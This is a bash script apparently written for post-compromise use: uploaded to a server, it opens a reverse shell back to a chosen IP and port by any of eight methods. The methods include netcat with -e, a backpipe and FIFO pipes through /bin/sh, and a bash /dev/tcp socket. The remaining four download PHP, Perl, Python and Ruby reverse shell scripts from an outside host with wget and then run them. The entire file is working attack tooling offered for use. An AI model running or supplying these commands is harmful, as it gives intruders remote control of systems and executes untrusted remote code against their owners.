#!/bin/bash
# Quick Reverse Connection Deployment Script
# By Hood3dRob1n
#
# Upload Script to Server, chmod +x reverser.sh, ./reverser.sh <#1-8> IP PORT
# Will create reverse connection using your method of choice and call home to IP given on designated port
# Dont forget to set your listener up before running....

# Set variables
METHOD="$1"
HOME="$2"
PORT="$3"
LINK="http://inf0rm3r.webuda.com/"

# Usage details
usage_info(){
cat << "EOT"
USAGE: ./reverser.sh <#1-8> IP PORT
EX: ./reverser.sh 6 192.168.1.22 5151

OPTIONS:
 1) Pentestmonkey PHP Reverse Shell
 2) NETCAT with GAPING_SECURITY_HOLE enabled
 3) NETCAT with GAPING_SECURITY_HOLE disabled - Backpipe Method
 4) NETCAT with GAPING_SECURITY_HOLE disabled - FIFO Method
 5) Bash /dev/tcp socket method
 6) Pentestmonkey Perl Reverse Shell
 7) Python Reverse Shell by Pi
 8) MagicC0d3r Ruby Reverse Shell

EOT
exit 0;
}

# Pentestmonkey PHP Reverse Shell with HR mods
PPHP(){
	echo
	if [ -d php-reverse ]; then
		rm -r php-reverse
	fi
	mkdir php-reverse
	cd php-reverse
	wget $LINK/scripts/php-reverse.tar.gz 2> /dev/null
	tar -zxvf php-reverse.tar.gz 2> /dev/null
	chmod +x php-reverse.php
	echo 'Deploying shell, be ready to catch the call home...'
	php -f php-reverse.php $HOME $PORT
	cd ..
}

# Netcat -e Gaping Hole Enabled Option
NETCAT_e(){
	echo
	command -v nc >/dev/null 2>&1 || { echo >&2 "Netcat isn't installed! Can't use this option without it..."; exit 0; }
	echo "OK, launching standard Netcat reverse shell now..."
	nc -e /bin/sh $HOME $PORT
}

# NO -e option, so use Backpipe Method
NETCAT_backpipe(){
	echo
	command -v nc >/dev/null 2>&1 || { echo >&2 "Netcat isn't installed! Can't use this option without it..."; exit 0; }
	echo "OK, that's all we need, launching Netcat backpiped reverse shell now..."
	mknod backpipe p && nc $HOME $PORT 0<backpipe | /bin/bash 1>backpipe
}

# NO -e option, so use FIFO Method
NETCAT_fifo(){
	echo
	command -v nc >/dev/null 2>&1 || { echo >&2 "Netcat isn't installed! Can't use this option without it..."; exit 0; }
	echo "OK, that's all we need, launching Netcat backpiped reverse shell now..."
	rm /tmp/f 2> /dev/null
	mkfifo /tmp/f
	cat /tmp/f | /bin/sh -i 2>&1 | nc $HOME $PORT > /tmp/f
}

# Straight /dev/tcp connection
dev_tcp(){
	echo
	echo "OK, launching bash and /dev/tcp scoket based reverse shell now..."
	/bin/bash -i > /dev/tcp/$HOME/$PORT 0<&1 2>&1
}

# Pentestmonkey Perl Reverse Shell
PPerl(){
	echo
	echo 'Fetching pentestmonkey Perl reverse shell script...'
	wget $LINK/scripts/pl-reverse.pl 2> /dev/null
	chmod +x pl-reverse.pl
	echo 'Deploying pentestmonkey Perl reverse shell...'
	./pl-reverse.pl $HOME $PORT
}

#Python Reverse Shell by Pi  from HF
PiPython(){
	echo
	echo "OK, fetching Pi's Python Revesrse Shell..."
	wget $LINK/scripts/pi.py 2> /dev/null
	chmod +x pi.py
	echo "Deploying Pi's Python Revesrse Shell..."
	./pi.py $HOME $PORT
}

# MagicC0d3r Ruby Reverse Shell
ruby_magic(){
	echo
	command -v ruby >/dev/null 2>&1 || { echo >&2 "Ruby isn't installed! Can't use this option without it..."; exit 0; }
	echo "OK, fetching Ruby reverse shell now..."
	if [ -d ruby-reverse ]; then
		rm -r ruby-reverse
	fi
	mkdir ruby-reverse
	cd ruby-reverse
	wget $LINK/scripts/ruby-reverse.rb 2> /dev/null
	chmod +x ruby-reverse.rb
	echo 'Deploying Ruby Reverse Shell, hope you have your listener ready...'
	ruby ruby-reverse.rb $HOME $PORT
	cd ..
}

#MAIN!!!!!!!!!!!!!!!!
#Confirm arguments passed properly (should probably replace later with while getopts style statement but this is it for now
if [ -z "$1" ] || [ "$#" -ne 3 ] || [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
	usage_info
else 
	if [ "$1" -eq 1 ]; then
		echo
		PPHP
	fi
	if [ "$1" -eq 2 ]; then
		echo
		NETCAT_e
	fi
	if [ "$1" -eq 3 ]; then
		echo
		NETCAT_backpipe
	fi
	if [ "$1" -eq 4 ]; then
		echo
		NETCAT_fifo
	fi
	if [ "$1" -eq 5 ]; then
		echo
		dev_tcp
	fi
	if [ "$1" -eq 6 ]; then
		echo
		PPerl
	fi
	if [ "$1" -eq 7 ]; then
		echo
		PiPython
	fi
	if [ "$1" -eq 8 ]; then
		echo
		ruby_magic
	fi
fi
# Greetz to and from INTRA!
# Enjoy!
#EOF
